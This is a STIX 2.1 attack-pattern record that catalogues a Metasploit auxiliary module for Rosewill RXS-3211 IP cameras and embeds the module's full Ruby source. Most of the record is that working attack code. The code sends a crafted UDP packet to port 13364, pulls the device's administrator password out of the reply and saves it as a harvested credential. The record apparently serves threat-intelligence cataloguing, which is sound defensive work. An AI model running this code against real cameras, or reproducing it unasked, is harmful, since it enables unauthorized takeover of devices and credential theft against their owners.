{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--88a5bb84-5654-4e28-b3f8-4417d9977185",
    "created": "2024-08-14T16:27:06.663175Z",
    "modified": "2024-08-14T16:27:06.663179Z",
    "name": "Rosewill RXS-3211 IP Camera Password Retriever",
    "description": " This module takes advantage of a protocol design issue with the Rosewill admin executable in order to retrieve passwords, allowing remote attackers to take administrative control over the device.  Other similar IP Cameras such as Edimax Hawking, Zonet, etc, are also believed to have the same flaw, but not fully tested. The protocol design issue also allows attackers to reset passwords on the device. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/misc/rosewill_rxs3211_passwords.rb",
            "external_id": "rosewill_rxs3211_passwords.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Udp\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'Rosewill RXS-3211 IP Camera Password Retriever',\n      'Description' => %q{\n          This module takes advantage of a protocol design issue with the Rosewill admin\n        executable in order to retrieve passwords, allowing remote attackers to take\n        administrative control over the device.  Other similar IP Cameras such as Edimax,\n        Hawking, Zonet, etc, are also believed to have the same flaw, but not fully tested.\n        The protocol design issue also allows attackers to reset passwords on the device.\n      },\n      'Author'      => 'Ben Schmidt',\n      'License'     => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::CHOST,\n        Opt::RPORT(13364),\n      ])\n  end\n\n  def run_host(ip)\n    #Protocol\n    target_mac = \"\\xff\\xff\\xff\\xff\\xff\\xff\"\n    cmd  = \"\\x00\"          #Request\n    cmd << \"\\x06\\xff\\xf9\"  #Type\n\n    password = nil\n\n    begin\n      udp_sock = Rex::Socket::Udp.create( {\n        'LocalHost' => datastore['CHOST'] || nil,\n        'PeerHost'  => ip,\n        'PeerPort'  => datastore['RPORT'],\n        'Context'   =>\n        {\n          'Msf' => framework,\n          'MsfExploit' => self\n        }\n      })\n\n      udp_sock.put(target_mac+cmd)\n\n      res = udp_sock.recvfrom(65535, 0.5) and res[1]\n\n      #Parse the reply if we get a response\n      if res\n        password = parse_reply(res)\n      end\n    rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused, ::IOError\n      print_error(\"Connection error\")\n    rescue ::Interrupt\n      raise $!\n    rescue ::Exception => e\n      print_error(\"Unknown error: #{e.class} #{e}\")\n    ensure\n      udp_sock.close if udp_sock\n    end\n\n    #Store the password if the parser returns something\n    if password\n      print_good(\"Password retrieved: #{password.to_s}\")\n      report_cred(\n        ip: rhost,\n        port: rport,\n        service_name: 'ipcam',\n        user: '',\n        password: password,\n        proof: password\n      )\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def parse_reply(pkt)\n    @results ||= {}\n\n    # Ignore \"empty\" packets\n    return nil if not pkt[1]\n\n    if(pkt[1] =~ /^::ffff:/)\n      pkt[1] = pkt[1].sub(/^::ffff:/, '')\n    end\n\n    return pkt[0][333,12] if pkt[0][6,4] == \"\\x01\\x06\\xff\\xf9\"\n  end\nend\n"
}